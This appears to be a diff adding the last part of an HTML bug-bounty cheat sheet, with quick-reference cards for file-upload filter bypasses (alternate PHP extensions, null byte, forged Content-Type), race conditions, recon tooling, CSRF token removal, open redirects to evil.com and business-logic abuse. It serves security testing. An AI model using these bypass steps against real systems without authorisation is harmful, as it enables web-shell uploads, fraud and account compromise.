+      <div class="quick-card">
+        <h4>File Upload Steps</h4>
+        <ol>
+          <li>Try .php directly</li>
+          <li>If blocked: try .php5, .phtml, .pHp</li>
+          <li>Change Content-Type to image/jpeg</li>
+          <li>Try null byte: .php%00.jpg</li>
+          <li>Find where file is stored</li>
+          <li>Access it to trigger execution</li>
+        </ol>
+      </div>
+
+      <div class="quick-card">
+        <h4>Race Condition Steps</h4>
+        <ol>
+          <li>Find one-time use action</li>
+          <li>Capture request in Burp</li>
+          <li>Send to Repeater x20 tabs</li>
+          <li>Use Send group in parallel</li>
+          <li>Check if action triggers multiple times</li>
+          <li>Use Turbo Intruder for precision</li>
+        </ol>
+      </div>
+
+      <div class="quick-card">
+        <h4>Recon Quick Flow</h4>
+        <ol>
+          <li>subfinder + amass + assetfinder</li>
+          <li>httpx to find alive hosts</li>
+          <li>gau + waybackurls for URLs</li>
+          <li>gf filters for vuln params</li>
+          <li>JS analysis with SecretFinder</li>
+          <li>Shodan/GitHub dorks for leaks</li>
+        </ol>
+      </div>
+
+      <div class="quick-card">
+        <h4>CSRF Quick Steps</h4>
+        <ol>
+          <li>Find state-changing action</li>
+          <li>Check for CSRF token</li>
+          <li>Remove token / use empty</li>
+          <li>Use token from your session</li>
+          <li>Check SameSite cookie attr</li>
+          <li>Generate PoC in Burp</li>
+        </ol>
+      </div>
+
+      <div class="quick-card">
+        <h4>Open Redirect Steps</h4>
+        <ol>
+          <li>Find redirect/next/url params</li>
+          <li>Try https://evil.com directly</li>
+          <li>Try //evil.com, /\evil.com</li>
+          <li>Check OAuth redirect_uri param</li>
+          <li>Chain: redirect → SSRF or XSS</li>
+        </ol>
+      </div>
+
+      <div class="quick-card">
+        <h4>Business Logic Steps</h4>
+        <ol>
+          <li>Map entire application flow</li>
+          <li>Try negative quantities</li>
+          <li>Skip steps in multi-step flows</li>
+          <li>Modify prices in requests</li>
+          <li>Apply discounts in wrong order</li>
+          <li>Think: "what should NOT work?"</li>
+        </ol>
+      </div>
+
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <p>Bug Bounty + VAPT Bible &mdash; Built for Rahul Masal | Based on: SSRF Paper, Bug Bounty Bootcamp, Real-World Bug Hunting, Web Hacking 101, 1000+ HackerOne reports</p>
+  <p style="margin-top: 8px; color: #444;">Happy Hunting &#x1F3AF;</p>
+</footer>
+
+</body>
+</html>
